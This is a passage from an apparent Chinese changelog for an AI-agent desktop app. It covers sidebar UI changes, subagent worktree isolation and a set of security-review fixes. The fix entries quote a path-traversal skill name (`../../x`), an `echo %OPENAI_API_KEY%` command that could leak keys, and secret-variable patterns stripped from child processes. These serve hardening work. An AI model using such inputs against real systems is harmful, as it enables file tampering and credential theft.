  发送第一条消息时才落库；其他项目=先切工作目录再新建；「远程连接」固定项目
  仍不可切工作目录，点＋打开它名下最近的对话；快聊组沿用原有＋；兜底组「其他」
  不提供新建）。组头整行点击恢复为展开/折叠该项目的会话；折叠态靠组头名称
  降透明度指示（展开恢复）。经典视图项目行同步新增悬浮「＋」（手感同 ✕，
  当前项目=新标签，其他项目=切换过去再新建，远程连接不提供）。拖拽排序、
  ✕/＋ 与行点击互不干扰。
- **经典视图：项目行 ✕/＋ 钉到行最右，快聊提升为项目行**：项目行的悬浮按钮
  此前跟在名称后面，现在名称吸收剩余宽度，✕/＋ 永远贴行右端。会话列表底部的
  常驻「快聊」区块上移进项目区（真项目之后、列表末尾，与分组视图的快聊组同一
  陈列语言）：点「快聊」行高亮它并把会话区切成快聊列表（回项目列表点项目行；
  不改引擎工作项目），悬浮＋新建快聊。无项目态下项目区只剩快聊一行（快聊是
  一等入口不变）。远程客户端拿不到跨项目列表，探测失败记住后不放这行（不重复
  请求）。
- **经典视图高亮与陈列统一为「点哪行亮哪行」**：项目区三类行（当前项目 /
  「远程连接」/ 快聊）的选中与高亮由点击驱动，同一时刻最多一行高亮：点当前
  项目=回本项目会话列表；点「远程连接」=高亮它并陈列渠道对话列表（不再直接
  打开最近一条，空列表给引导提示）；点快聊=高亮它并陈列快聊列表。不再随标签
  切换自动进退（旧逻辑依赖过期列表判定，会出现「点了快聊马上弹回」「新建的
  快聊会话不显示」）；会话区高亮独立且最多一条（点哪条亮哪条）。is_current
  仍用于切换/删除等逻辑判定，高亮纯视觉。
- **新建会话立即出现在侧栏**：侧栏/顶栏/Ctrl+N 新建的会话此前只是打开一张
  空白欢迎页标签，要等发出第一条消息才落库——侧栏列表只陈列已落库的会话，
  于是「新建后侧栏永远没有新行」。现在新建即向后端落库，侧栏立即出现对应行
  （标题「新会话」，发送后自动被真实标题替换），列表同时切回当前项目视图
  （哪怕此前在看快聊/远程）；关标签只是从对话页收掉页签，不删会话——会话
  仍留在侧栏（随时点回来），删除统一走左侧会话行的 ⋯ →「删除会话」或侧栏
  底部「清理空会话」；启动欢迎页上发出的首条消息（懒创建路径）同样即时
  上屏。启动时无可恢复会话仍保持懒创建（只开欢迎页不落库，避免每次启动
  都堆空会话）；连点新建复用当前未发消息的标签，不堆一排空会话。
- **分组视图组头高亮跟随正在看的会话**：组头高亮此前只按引擎当前项目渲染——快聊、
  远程连接的会话激活时引擎工作项目不变（切目录才有意义），于是「已切到快聊、组头
  高亮还挂在原项目」。现在高亮跟随活动标签所在组（快聊会话亮快聊组、项目会话亮其
  项目组，欢迎页回落引擎当前项目），切标签、新建/关闭标签、侧栏点会话三种路径都同步；
  会话行选中态与组头高亮同一来源，不再各跟各的。切换/删除/跨项目会话点击的判定
  仍按引擎当前项目，高亮纯视觉。
- **分组视图组头同样「点哪行亮哪行」**：组头高亮此前只跟「正在看的会话」
  所在组，点别的组头折叠/展开时高亮不动，「点到了哪」没有反馈。现在点组头
  会把高亮收给那个组；再点会话/切标签时，高亮交回活动会话所在组（上一版
  「已切到快聊、高亮跟到快聊」保持）。点了组头后新建会话、关掉最后一张标签、
  切视图、切项目都会把临时高亮复位；点的组若已不存在（项目被移除、孤儿清空）
  自动落回活动会话，不会整列无高亮。同一时刻仍最多一个组头亮。
- **「新建会话」跟随侧栏高亮**：分组视图点亮的组头（含活动会话回落的组）、
  经典视图正在看的列表行，就是它的落点：高亮其他真实项目 → 先切过去再新建
  （同组头 ＋）；高亮快聊 → 新建快聊会话（列表不动，新行马上出现在快聊里）；
  高亮「远程连接 / 其他」→ 不能建，就地提示。左上按钮 / Ctrl+N / 窄栏＋ /
  标签栏＋ / 命令 /new 共用这一处；此前它恒在当前项目里建并跳回当前项目视图，
  界面上表现为「点了 A，新会话却跑去反代、高亮也跟着跳走」。组头与项目行
  自己的 ＋ 不变——它们本身就是明确落点。
- **右侧面板整面体检：12 个页签前后端链路逐一核对后的成组修复**：
  - **审查页切会话显示旧数据**：检查点按引擎当前会话取，但切聊天标签只发
    `session.activate`、审查页不重拉——列表停留上一个会话的改动轮次，与工具栏
    「本会话中 Agent 改过的文件」矛盾且不点「刷新」不自愈。现在切会话时审查页
    与任务清单页（同为会话绑定数据）自动重拉；任务清单页同时补上数据加载器
    （此前只靠 `todo_updated` 事件，打开/恢复/切项目路径会见到空壳或上个会话的清单）。
  - **Agent 改文件后审查页不再要手动刷新**：写/改/移动/删除/建目录的工具完成事件
    现在也触发审查列表防抖重拉（与文件树刷新同一机制）；移动/删除/建目录此前
    连文件树都不刷新，一并纳入。
  - **辅助对话的目录感切项目后失效**：aux 系统消息（含 cwd）只在历史为空时注入，
    而历史是引擎级单例——切项目后继续提问，模型仍以为在旧目录。现在切项目
    （引擎重绑工作目录）时重置辅助对话历史。顺带补忙碌反馈（发送中按钮变灰）
    与「清空」确认（面板对话与模型记忆一起清，先问一声；后端清空失败不再吞掉）。
  - **断线清账**：已发出的 WS 请求在连接断开时就地报错（新连接不认识旧 id，
    等下去是永远等不到），未发出的在重连后补发——此前断线期间辅助对话可能
    永久卡在「发送中」。重连成功后整体重拉右侧面板打开中的页，断线期间
    日程/任务/文件树的变化不再滞留旧屏。
  - **项目记忆读写走 textio**：GBK 等非 UTF-8 的 AGENTS.md 此前按 utf-8+replace
    读进编辑框（保存即把替换字符写死），系统提示词注入侧同病——每轮对话注入
    的是乱码。现读写均探测编码、保存沿用原编码与行尾符并原子落盘；编码探不确定
    拒绝保存。超 8000 字截断不再静默：结果带 truncated / original_chars / limit，
    界面明示「超出部分未保存」；「重读」在有未保存修改时先确认。
  - **杂项澄清**：`schedule_reminder` 事件缺 `break` 直落 `session_updated` 分支
    （今日恰好无害的隐患）；`/todos` 状态映射把 completed 错写成 done（完成项
    显示空心圈）；流水线 `dep_mode`（any/all 依赖语义）此前只有后端支持、前端
    零呈现——创建表单可选「任一/全部完成」、详情标注满足方式；MCP/Skills 页签
    打开时后台连接状态变化现在也会刷新卡片（此前只认设置页开着）；无项目时
    任务编排页给引导空态而非「加载失败」；「全部取消」子任务、删除定时任务加
    确认；浏览器预览切项目后收回旧项目的 /preview 页面，访问公网站点时提示
    「拒绝内嵌会空白」而非让人以为坏了。
- **设置页主题卡的「纸墨」色板跟着当前主题变色**：设置页色板是运行时挂
  `data-theme` 同属性探针元素从 CSS 变量取的，而纸墨作为默认主题变量只挂在
  `:root` 上、没有 `[data-theme="paper"]` 选择器，探针命中不了任何规则、
  继承 `<html>` 当前主题的颜色——纸墨卡随夜墨/松烟变深、切主题就变样
  （index.html 首帧兜底的写死色块反而是对的）。现把该变量组同时挂到
  `:root, [data-theme="paper"]` 上，探针取得到纸墨本色；其余五套主题本就有
  各自的变量组，不受影响。
- **「跟随系统」卡的色板改为按「深浅落点下拉 + 系统深浅」预览**：此前画的是
  「当前解析落点」——选了具体主题后，这张卡就跟那张卡长得一模一样（看不出
  auto 会落到哪）。现在只看下方两个下拉与系统深浅：选着秋柿时，系统深色 +
  深色用夜墨，卡上就是夜墨色板；系统深浅翻转时卡片同步重绘（auto 与具体主题
  两条路径都覆盖）。顺带把「浅色用 / 深色用」两个下拉从原生默认样式换成设置页
  纸面框同款（硬墨描边 + 铅字投影 + 悬浮/聚焦反馈），与主题卡、模型选择一致。

### 移除

- **技能广场整体下线（不再回归）**：1.9 只是摘掉了设置页入口，这次把整条链路清干净——
  前端索引/搜索/安装界面（已在 1.9 移除）、后端 `skills/market.py` 与
  `skills.market` / `skills.market_detail` 两个 WS 方法、60 秒索引缓存、
  随包索引数据文件（`market/index.json`，打包脚本与 `SkySheep.spec` 同步清理）、
  仓库根的 `market/` 索引发布件，以及只服务于「已安装/可更新」标注的
  `.source.json` 来源标记（`loader` 的 `source_url` 字段与读取、`installer` 的
  标记写入与 `raw_skillmd_urls` 详情预览链）。技能安装本身不受影响：仍支持
  文件夹 / .zip / GitHub·Gitee 链接导入、「本机现存」扫描导入与批量删除；
  skill 目录若残留旧的 `.source.json`，装载时忽略（不再读取）。

## [1.8] - 2026-09-23

### 新增

- **子代理隔离派生（git worktree 目录级隔离）**：`spawn_agent` 新增 `isolated=true`
  （需 `background=true`，且项目是 git 仓库，否则派生时即拒绝）：任务跑在
  `<项目>/.skysheep/worktrees/<task_id>` 的专用 worktree + 独立分支
  `skysheep/task-<task_id>` 上，写入不碰主工作区；完成时引擎自动把改动提交到该分支，
  `check_task` / `wait_task` 报告与结果载荷带工作区路径、分支名与合并/清理指引——
  审查与 merge 由主会话在权限门确认下执行，引擎不自动合并。新的 `IsolatedGate`
  是隔离任务的安全边界：工作区内的文件写入自动放行（工作区是引擎建的、分支可整体
  丢弃，隔离本身就是确认的替代），越界写入被工具层硬拦截，命令执行仍然预拒绝
  （后台无确认通道，且命令能越出工作区）——验证步骤让任务写进报告，合并后由
  主会话执行。worktree 目录登记进仓库本地忽略（`.git/info/exclude`，不动被跟踪的
  `.gitignore`）；任务簿持久化隔离字段，重启后分支与工作区位置仍可查。多个会改
  文件的并行任务从此各自在独立分支上干活，互不覆盖（与写租约正交：不同工作区
  各取各的租约枢纽，天然不互相等待）。新模块 `core/worktree.py`。

- **并行任务写路径协调（写租约）**：同一项目里多会话、流水线节点、定时任务并行时，
  写同一文件的调用此前互相不知道，后写者静默覆盖前写者。现在写工具执行前经权限门
  领一条「写租约」（新模块 `security/leases.py`，按项目一个枢纽——主会话门、定时
  任务门、流水线 headless 门、渠道门跨实例共用），执行完归还；目标正被其他会话
  持有时先等对方用完（上限 10 秒），超时也按原计划写入但带冲突注记追加进工具结果，
  模型与用户都看得见这次并行写入。设计上刻意不伤效率：粒度是文件路径（目录删除/
  移动另做祖先关系判定），租约只存活一次调用（agent 循环 finally 归还），只读工具
  完全不参与；面板「保存」接了同款租约（短等待），与 Agent 写同一文件时错开。
  `run_command` 里的命令改文件仍然看不见，与检查点是同一条边界。

- **设置 · 高级 一次补齐八件事，围绕「白名单 / 钩子 / 运行参数 / 安全」四张卡**：

  - **钩子测试器**：写完钩子只能靠真实工具调用试错——现在卡片里折叠了「钩子测试器」，
    选类型（pre / post / stop）、填命令与示例参数 JSON，点「试一下」就实跑一遍，回显
    退出码、stdout / stderr、耗时，pre 语义下直接告诉你会不会阻止这次调用。新 WS 方法
    `hooks.test` 只执行不落配置、不进执行记录；测试会真实运行命令，与 `hooks.save` 同一
    信任模型，列为本机专属方法。
  - **钩子「最近执行」面板**：钩子自身故障（非 0 非 2 退出码）按设计静默放行，但此前
    完全不可见，「配了像没配一样」。`HookRunner` 现在把每次执行（类型 / 工具 / 退出码 /
    状态 / 耗时 / 输出摘要）记进进程内环形缓冲（24 条，重启清空），设置页折叠展示，
    故障行标红。
  - **钩子与白名单规则的启停开关**：临时停用不必删配置。每条钩子、每条白名单规则
    带启用开关；停用的规则保留在配置 / 库里但不参与匹配，`hooks.get` 的「已生效 N 条」
    与白名单测试器都如实区分（测试器会点名「有条规则本可命中，但它已被停用」）。
    `whitelist_rules` 表新增 `enabled` 列（旧库自动迁移），`whitelist.enable` 启用方向
    限本机、停用方向远端也放行（收紧动作）。
  - **白名单命中统计**：规则是「总是允许」时悄悄攒起来的，攒多后不知道哪些还有用。
    `whitelist_rules` 新增 `hit_count` / `last_hit_at` 列（旧库自动迁移），`authorize`
    放行路径上顺手记账（`explain` 测试不记账），规则列表显示「命中 N 次」，帮助清理
    陈旧规则。
  - **钩子新增 stop 类型**：「跑完弹提醒」此前要靠 post 钩子逐个 match 命令类工具。
    新增 `[[hooks.stop]]` 组，在一轮以最终回答结束（不再调工具、没出错）时触发，
    与 post 同姿态仅通知不阻断；stdin 载荷新增 `session_id` 字段（`Agent` 新增
    `session_id`，会话 / 定时任务 / 编排派生处透传），多会话场景钩子可区分来源。
  - **压缩触发比例**：此前往后 100% 顶满上下文才压缩，长对话总在「快要压缩时」撞上游
    400、前面迭代的费用作废。新增 `compaction_trigger` 配置（默认 0.9，范围 0.5–0.98），
    占用达到「上限 × 比例」就提前压缩；设置 · 高级新增「压缩触发比例」输入（按百分数
    编辑），`advanced.get / save` 同步下发、热生效。
  - **运行参数「恢复默认」**：40 轮 / 1,000,000 / 保留 8 / 触发 90% / 预算不限五个默认值
    散在提示文案里，调乱后没有一键还原——卡片头部新增「恢复默认」，填回默认值并立即保存。
  - **已信任项目清单**：信任按项目记在 `~/.skysheep/workspace-trust.json`，设置页却只能
    看当前项目状态。「安全与后台」卡新增折叠清单，列出全部已信任项目（路径 + 信任时刻，
    标注当前项目），支持逐条撤销——撤当前项目同步断开其项目级 MCP、重载技能，撤别的
    项目只删记录。新 WS 方法 `trust.list`（含绝对路径，限本机）与 `trust.revoke_path`
    （收紧动作，远端也放行）。

- **用量页费用估算支持提示词缓存拆算，模型服务编辑页补上单价输入**。provider 层早已
  归一采集缓存命中数（`cached_tokens`，OpenAI 系读 `prompt_tokens_details`、Anthropic
  归一进 input），但只用于会话内浮窗、从未落库——对 DeepSeek 这类命中价差近 10 倍的
  服务，「估算费用」一直系统性虚高。现在 `usage_log` 新增 `cached_tokens` 列（旧库自动
  迁移补列），主轮 / 圆桌成员与主席 / 子代理三条入账路径全部带缓存入账；模型服务配置
  新增「缓存命中单价」（`price_cache`，默认 0 = 不区分），填了它费用按「命中部分 × 缓存价
  + 其余 × 输入价」拆算，用量页累计磁贴附「缓存命中」合计。顺带补上**编辑页的三个单价
  输入框**（输入价 / 输出价 / 缓存命中价）——协议层 `config.save_provider` 早就支持
  `price_in / price_out`，界面却一直没有入口，用量页文案让用户「在编辑页填单价」实际无处
  可填。环形图分段色板改走 CSS 变量 `--dm-c1..8` 并为三套深色主题各自提亮（原写死纸墨
  色值，夜墨 / 黛夜 / 松烟下对比度不足）；会话排行行可点击直接打开对应会话；「单日峰值」
  磁贴副标题改为峰值所在日期；折线图仅一个数据点时放大孤点；「今日已用」标注「（全局）」
  口径——预算护栏是全局设置，与项目态下其余项目口径数字并排时不再误读。

### 修复

- **扫描本机技能被「不受信任的装入点」打挂（WinError 448，实测）**：Windows 11 的
  装入点信任检查开始拦截遍历某些目录联接（junction）后，`skills.scan_local` 探测
  `~/.claude/skills` 时在别家安装器留下的 junction 上被单次 `is_file()` 的 OSError
  击穿——pathlib 只吞 ENOENT/ELOOP 这类错误，一条坏目录让整条 RPC 连同「本机现存」
  面板一起失败。三处加固：`_scan_skills_in_dir` 的存在性探测改走容错版（OSError
  一律按「没有」处理）；联接目录（reparse point——`is_symlink()` 认不出 junction，
  须查文件属性位）既不作候选也不下钻，顺带断掉指向上级的联接让 `os.walk` 成环的
  死循环；`_load_skill_from_dir` 与 `discover()` 对单条读不出来的条目跳过而非冒泡，
  自家技能目录里混进坏条目也不再拖垮启动加载。junction 回归用例用真实 `mklink /J`
  搭故障结构（含自引用成环），Windows 上跑、其余平台跳过。
- **程序内一键更新的三件收尾（实测 1.7→1.8 暴露）**：更新包下载、校验都没问题，
  卡在安装器拉起之后——安装包默认要管理员权限，静默安装停在 UAC 等确认，用户此时
  重开程序看到的还是旧版，「更新了但版本没变」。三处修正：其一，安装登记在 HKCU
  （per-user，装在用户目录）的安装给安装器传 `/CURRENTUSER`，静默直装不再弹 UAC；
  登记在 HKLM 的必须提权，维持默认。其二，安装器不再是黑箱：`/LOG` 落到
  `~/.skysheep/logs/update-setup.log`，头部记何时装哪个包走哪条权限路径，安装结束
  追加退出码；前端在点按钮前明确提示「若弹出用户账户控制请点是」。其三，装完自动
  拉起新版（`/RESTARTAPP` + installer.iss 的 [Run] 条目，`runasoriginaluser` 不继承
  管理员权限；只对更新链路生效，手动静默安装行为不变）。顺带修掉延迟的真 bug：
  helper 原用 `timeout /t 2` 做延迟，但更新以 DETACHED_PROCESS 拉起 cmd、没有控制台，
  timeout 的输入重定向检查会立即失败返回——2 秒等待名存实亡，全靠 UAC 卡住的几分钟
  侥幸让互斥体得释；现改用 `ping -n 3`（无控制台依赖，约 2 秒）。
- **整理备份时间戳撞名互相覆盖**：备份文件名带微秒（`bak-YYYYMMDD-HHMMSS-%f`），
  但部分 Windows 机器（CI 虚拟机常见）的 `datetime.now()` 精度只有 ~15.6ms，连续
  两次备份拿到完全相同的时间戳、按名直接写把上一份盖掉（CI 上 7 份只剩 3 份，
  `test_backup_before_maintain_rotates` 挂红）。撞名时追加零填充序号（`-001`），
  字典序仍按时间推进，滚动清理口径不变。
- **项目列表同秒创建时排序不稳定**：`project.list` 只按 `created_at DESC` 排，
  而 `created_at` 是秒级——同一秒内创建（或添加）的项目次序由 SQLite 扫描序
  碰运气，快速连建两个项目的测试因此间歇挂红（与备份撞名同族的计时精度问题）。
  补 `id DESC` 次级键：同秒时后建的 id 更大排前面，「新的在前」语义不变。
- **安全审查低危项收尾（文档口径与体验修正）**：把审查报告第三节里「值得顺手做掉」的
  几条落地，其余（渠道凭据存放、`?token=` 进浏览器历史、cookie 无 `Secure`）写进
  `SECURITY.md` 的「已知取舍」——它们是设计取舍而不是待修缺陷。

  - **grep 能搜到 GB18030 文件了**：此前固定按 UTF-8 解码，GBK/GB18030 中文文件
    整片漏检（读出来全是替换字符，匹配不上任何中文模式）。现在按 `textio` 的编码
    探测解码（UTF-8 → GB18030，round-trip 校验），二进制文件照旧跳过。
  - **渠道审批词收紧**：`ok` / `1` / `可以` 此前也算批准——这几个词在中文聊天里更常
    是随口应和（"1" = 收到），待审批窗口期把它们当批准会吞掉正常聊天、甚至替一次
    写/执行操作背书。现在批准只认明确授权词（`allow` / `yes` / `允许` / `同意`），
    拒绝方向保持宽松；用户回歧义应和词时给一句「批准请回 allow」的指引，不再让它
    排队等在前一轮后面卡到超时。渠道预授权名单里含写/执行类工具（`run_command`、
    `write_file` 等）时，保存结果与设置页卡片都会显式告警（无人值守 = 任意命令）。
  - **后台任务不再可能被 GC 掉**：`asyncio` 只对任务持弱引用，`create_task` 的
    返回值没人接住时任务可能在跑一半时消失（表现为「偶尔没发出去」）。新增
    `bgtasks.spawn_bg`，19 处 fire-and-forget 任务（通知、冲刷、后台收尾、MCP
    重连等）改走它；需要在别处保存引用的任务仍自己管。
  - **文本探测缓存改实例属性**：`_text_meta_cache` 此前是类属性，被所有
    `ServerBackend` 实例共享（测试与多实例场景互相串味）。
  - **令牌轮换不再顺手解封**：`lan.rotate_token` 此前直接换一个新 `TokenThrottle`，
    正在被封锁的爆破来源跟着一起解封。现在只清失败计数，已生效的封锁按原冷却时间
    走完（换锁不等于放人进来）。
  - **FTS 索引失败可诊断、可修复**：索引写/删失败此前静默吞掉——那条消息永久搜不到，
    而启动时的补齐走 rowid 水位，修不回水位以下的空洞。现在记日志并置脏，下次启动
    改走「缺哪行补哪行」的查漏模式；补齐数量也记进日志。
  - **同名技能优先级写明**：全局技能优先、项目级同名技能被遮蔽（与 MCP「项目覆盖
    全局」相反）。这是有意为之——项目技能来自仓库，让仓库技能覆盖用户自己的全局
    技能等于扩大「项目能改模型行为」的边界；需要按项目定制时换名字或用技能的
    scope 机制。文档已补（`skills/loader.py` 与 `AGENTS.md`）。
  - **文档与资产整理**：`engine/README.md` 的渠道模块描述从 Telegram 改回飞书
    （Telegram 已下线，历史只留在 CHANGELOG）；`engine/installer/` 只留现版
    `SkySheep-1.7-setup.exe` 与上一版 `1.6`，旧编号 1.5/1.8/1.9/2.0/2.1/2.2 的
    安装包移入 `归档/安装包历史-已下架/`（避免误传成 Release 资产）。

- **安全审查（2026-09 第二轮）逐项修复**：对 2 项高危 + 16 项中危 + 低危择要做了
  修复，每条都带回归测试（新增 `tests/test_compaction_persist.py`、
  `tests/test_imagegen_hardening.py`，其余并入既有套件）。

  - **技能名路径穿越（高危）**：技能 frontmatter 的 `name` 此前只做显示清洗，
    安装 / 删除的落点直接拼在技能根下——`name: ../../x` 能写到技能目录之外
    （删除路径同理会删到外面）。现在安装与删除统一经 `_validate_skill_name` +
    `_skill_target`：拒绝含路径分隔符 / 冒号 / 目录引用 / 纯点空格 / 超长的名字，
    并校验 resolve 后的落点仍在技能根内（`skills/installer.py`）。
  - **压缩后消息落库切片错位（高危）**：轮末落库按 `history[n_before:]` 切片，
    而压缩会在本轮内把历史整体换成更短的列表——新长度不大于轮前时本轮消息全部
    不落库（重启即丢），略大时又会重复插入旧消息。改为按消息 id 身份识别本轮新增
    （`core/context.py` 新增压缩摘要标记与 `is_compaction_summary`，摘要本身不入库）；
    历史重载统一走 `_reload_agent_history`，载入后补回实时生成的 system 提示词
    （旧写法只兜住空会话，非空会话重载后第一轮就带着「没有系统提示词」的历史调模型）。
  - **远程与更新面收紧**：`app.install_update` / `app.apply_update` 列入本机专属
    （远程只能查更新，不能下载并执行安装包）；更新包下载改到随机私有临时目录并清理
    过期目录，发布 tag 先过白名单正则再进路径与命令行，下载流式限体积 + MZ 头校验 +
    有 `.sha256` 附件则校验（`core/uptodate.py` 的 `is_safe_tag`）。
  - **DNS rebinding（本机回环）**：WS 与 HTTP 两侧对「对端是本机」的连接校验 Host
    必须指向本机（127.0.0.1 / localhost / ::1 / 本机名 / 本机地址），外来域名一律
    421 / 4403 拒绝；非本机对端（局域网 / Tailscale）不校验，保住远程控制。附带
    给界面响应加 `X-Frame-Options: SAMEORIGIN` 与 `frame-ancestors 'self'`。
  - **权限决策白名单**：`permission.respond` 的 decision 先过白名单，认不出来的值
    按拒绝处理（旧实现直接透传，主循环只显式处理两种，其余落到执行工具——乱码等于放行）。
  - **`move_file` 覆盖已存在目录**：`overwrite=true` 且目标解析成已有目录时属于删除
    语义，自动允许写入档不再放行，回到逐次确认。
  - **诊断包打码补齐**：`secret` / `password` / `passwd` / `credential` / `private`
    形态的键一并打码（此前只覆盖 api_key / token / env_key）。
  - **子进程环境剥离密钥**：`run_command` 拉起的进程不再继承 `*_API_KEY` / `*_TOKEN` /
    `*_SECRET` / `*_PASSWORD` / `*_CREDENTIAL` 等形态的环境变量（`GIT_ASKPASS`、
    `SSH_AUTH_SOCK` 这类非密钥本体保留），PATH / SystemRoot 等必需变量照旧——此前
    一条被确认的 `echo %OPENAI_API_KEY%` 就能把以环境变量配置的 Key 读进对话。
    命令改为用 `%ComSpec%` 与 `System32` 绝对路径调用（防同名 exe 劫持）。
  - **首屏快照对远程打码**：`boot` 的 `working_dir`、`instructions_file`、
    `providers[*].base_url`、`skill_dirs`、`mcp_config` 路径对局域网 / Tailscale
    客户端返回空串（与 `project.list` 打码 `root_path` 同一口径）；「能不能用」的
    信息（模型、有无 Key、工具与技能清单）照给。
  - **画图 SSRF 加固**：`generate_image` 的生成接口与图片下载都做公网校验并把连接
    固定到已校验 IP（`_SyncPinnedBackend`，web_fetch 那套的同步版），响应体流式
    限长（下载 8MB、接口 JSON 8MB，超限立即中止）——此前只校验不固定（每跳都有
    DNS rebinding 窗口），且先全量进内存再查上限。
  - **MCP 导入确认与超时**：导入含 stdio（command）定义时先回 `needs_confirm` 与
    命令清单，前端弹一次显式确认才写盘（连接即执行本机命令，粘贴一段 JSON 不该
    等于声明允许运行任意程序；分字段表单与内置预设不受影响）；keeper 内
    `initialize()` / `list_tools()` 各带独立超时，调用方超时后走 `_close_connection`
    真正收割 keeper——挂死的服务器不再泄漏 keeper 任务与 stdio 子进程。
  - **取消路径三件收尾**：`Agent._pending` 在轮次结束（含取消）时清空，残留的
    permission 请求不能再被「成功投递」；轮首自动修复「有 tool_use 无 tool_result」
    的断裂历史（Anthropic 协议下次调用会 400）；迭代到顶时发明确事件说明原因，
    不再静默断头。
  - **持久化与渲染**：`textio` 新增 `write_text_atomic` / `write_bytes_atomic`，
    config.toml、任务簿、mcp.json、ui.json、检查点 meta 与回滚写回全部改原子写
    （写一半崩溃不再留下截断文件）；手改 config.toml 的越界 / 非数字值夹回合法
    区间（此前只 `int()` 转换，越界直接让启动炸在 pydantic 校验上）；CLI 渲染
    剥离终端控制序列（`[2J` 清屏、OSC 改标题、隐藏光标等，含 C1 与字符集
    选择序列），只影响 CLI 面。
  - **隔离任务取消清理与检查点限额**：取消隔离任务时先把取消前的部分改动提交到
    隔离分支（不丢活），再移除 worktree 目录与注册（不再留悬挂项等手动 prune），
    分支保留并在收尾说明里给出查看 / 合并 / 删除指引；检查点加三层字节限额
    （单文件 32MB、单条 256MB、全库 1GB），超限的文件不进快照、总量超限按时间淘汰，
    不再能被「一轮写个大文件 × 50 条」吃穿磁盘。
  - **信任延续不再洗白其他来源**：`trust.refresh(touched=...)` 逐来源比对，只有
    「变了的来源都落在用户本次操作涉及的那个之内」才延续信任——项目已信任时被
    第三方改过的项目级 mcp.json 不再会因为「随手装了个技能」被一并放行并自动连接。
  - **低危择要**：`web_fetch` 对端伪造 charset 不再穿透成 LookupError（认不出来
    回 utf-8）、URL 里的 userinfo 剥离后再请求；检查点回滚改原子写；Markdown
    渲染的外链补 `rel="noopener noreferrer"`；`default_tools` 的
    `computer_control` / `browser_control` 形参默认值改为 `False`（与配置默认值
    同一口径，新调用方漏传不会静默打开截屏 / 键鼠 / 剪贴板）。

- **更新检查不再吃 GitHub API 限流的 403**：更新源原走 `api.github.com` 的 Releases 接口，
  匿名请求按出口 IP 每小时 60 次限流，国内共享出口常被同 IP 用户耗尽，「检查更新」
  一点就报「更新源返回 HTTP 403」。现在改请求 `releases/latest` 页面本身，从 302 的
  Location 里取版本号，页面跳转没有这份配额。代价是拿不到 release 说明与附件清单：
  说明不再展示（前端本就未渲染），一键更新的安装包地址按发布约定
  （`SkySheep-<版本>-setup.exe`）拼出，附件真缺时下载以 404 暴露并回退到原有人工提示。

- **并行任务互不串台（同一项目多会话 / 任务并行的四件正确性修复）**：不同会话、流水线
  节点、定时任务同时在一个项目里跑时，此前的共享状态会互相干扰——

  - **子代理归属不再依赖全局「当前会话」指针**：`TaskManager._active_sid` 是单指针，
    两个会话并行跑轮时后开轮的会话会覆盖它，用量记账、任务簿归属、`check_task` /
    `wait_task` 的归属校验全部串台。现在会话归属在派生时随调用传入（`ToolContext`
    新增 `session_id`，`spawn_agent` 从 ctx 取），指针删除。
  - **后台进程按启动会话隔离**：`run_command` 的后台进程注册表是进程级共享且无归属
    校验，任何并行任务都能读、杀别家起的服务进程。现在每条记录带 owner，
    `action=read / kill / list` 按会话过滤（owner 为空的无会话态如 CLI 保持可用）。
  - **检查点淘汰按会话分桶**：50 条上限原先是全项目 FIFO，轮次多的会话会把别的会话
    还能回滚的快照挤掉。现在每会话各有 50 条配额，另设全项目 500 条兜底上限防磁盘
    无界增长。
  - **检查点回滚前先做脏检查**：保存时记录每个文件「保存时刻」的内容签名（随 meta
    落盘，重启有效），回滚前比对当前内容——快照之后又被改过（最典型是并行任务写了
    同一文件）就抛冲突、不动磁盘，前端列出冲突文件请用户确认后带 `force=true` 强制
    恢复；旧版快照（meta 没存签名）跳过检查保持原行为。
  - **写文件原子化**：`write_text_file` 改为「同目录临时文件 + `os.replace`」，消除
    「写一半」的中间态暴露给并发读者（其他任务的工具、检查点回滚、编辑器自动重载）
    与进程被杀留下半个文件的撕裂窗口；POSIX 上覆盖时保留原权限位、新建按 umask。
  - **工具 diff 挂到调用上下文**：`last_diff` 原先存在工具实例上，而同一套实例会被
    并行任务共享（任务簿缓存、自定义子代理复用主注册表），A 任务的 diff 会错配给
    B 任务的事件；现在由 `ToolContext` 按调用携带，agent 循环执行完立即取走。

- **高级页保存提示对热键撒谎**：`advanced.save` 成功后一律提示「✓ 已保存并立即生效」，
  而同卡热键的说明写着「重启应用生效」——改了热键的用户被误导。现在保存时对比改前值，
  热键有变更时提示「已保存；全局唤起热键在重启应用后生效」。

- **用量页「参与会话」在有用量时显示 0**：无项目态（快聊）按安全审查 B14 隐藏带会话
  标题的 `by_session` 明细，而磁贴直接拿它的长度当会话数——出现「累计 1.9 万 tokens、
  参与会话 0」的自相矛盾；项目态下 `by_session` 截到最近 12 条，会话一多计数也永远封顶
  12。现在 `usage_stats` 单独返回 `COUNT(DISTINCT session_id)` 的 `session_count`（纯
  计数不带标题，不违反 B14），磁贴在两种形态下都是真实去重数。
- **模型用量图例在「同服务多模型」时显示任意模型名**：`by_provider` 聚合用 `MAX(model)`
  ——同一服务先后用过多个模型（改配置、历史行）时图例挑哪个全看 SQLite 心情。改为按
  服务 × 模型分组，图例逐模型如实展示。

- **技能广场整体升级：已安装标注、版本更新、分类筛选、详情预览、手动刷新**。此前广场只
  是一张「名字 + 一句话 + 安装按钮」的扁平清单：装没装过看不出来（重复点安装只会撞一句
  重名报错）、技能永远无法升级（重名不覆盖，只能手动删了再装）、25 条技能只能靠搜索翻。
  这次一次补齐五件事：

  - **已安装 / 可更新标注**：从网址安装时，安装器会在每个装好的技能目录里写
    `.source.json` 记录安装来源 url；广场拉索引时把它与本地技能比对，装过的条目按钮
    变「✓ 已安装」（置灰），来源标记出现之前装的旧技能按「条目 url 末段与技能名同名」
    兜底匹配。索引条目新增可选 `version` 字段，与技能 SKILL.md frontmatter 的
    `version`（新增支持）比对，索引版本更新时按钮变「更新」，点击走覆盖式重装
    （`install_*` 新增 `overwrite` 参数，同名技能整目录替换；默认行为不变，本地比
    索引还新时不提示降级）。安装成功后就地刷新该条状态，不重置搜索与筛选。
  - **分类筛选**：索引条目新增可选 `category` 字段，25 个技能分成办公写作 / 内容创作 /
    数据与分析 / 学习成长 / 开发辅助 / 效率工具 / 生活助手 / 文档处理八类；界面出
    胶囊筛选标签（与搜索叠加过滤），索引里自产场景技能排在前、anthropics 官方文档
    技能排在后；搜索命中时名称前缀命中的排最前（名称就是用户想搜的那个词的技能
    应该在第一屏）。`skills-gallery/` 的 20 个 SKILL.md 已全部补上 `version: 1.0.0`。
  - **详情预览**：每个条目新增「详情」按钮，新 WS 方法 `skills.market_detail` 按条目
    url 解析出 SKILL.md 的 raw 直链（GitHub / Gitee，分支未写时猜 main / master；
